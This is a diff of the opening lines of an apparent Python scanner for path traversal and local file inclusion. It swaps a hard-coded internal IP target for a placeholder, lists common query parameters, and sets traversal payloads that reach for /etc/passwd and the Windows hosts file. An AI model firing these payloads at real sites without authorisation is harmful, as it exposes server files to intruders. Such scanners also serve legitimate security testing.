@@ -1,5 +1,5 @@
 import requests
-ip_addr = "http://192.168.105.53:4443/site"
+ip_addr = "http://IPAddress:port/" #<-- change this to website to test 
 lyst=["?cat=","?dir=","?action=","?board=","?date=","?detail=","?file=","?download=","?path=","?folder=","?prefix=","?include=","?page=","?inc=","?locate=","?show=","?doc=","?site=","?type=","?view=","?content=","?document=","?layout=","?mod=","?conf="]
 lin = "../../../../../../../../../../../../etc/passwd"
 win = "C:/WINDOWS/System32/drivers/etc/hosts"
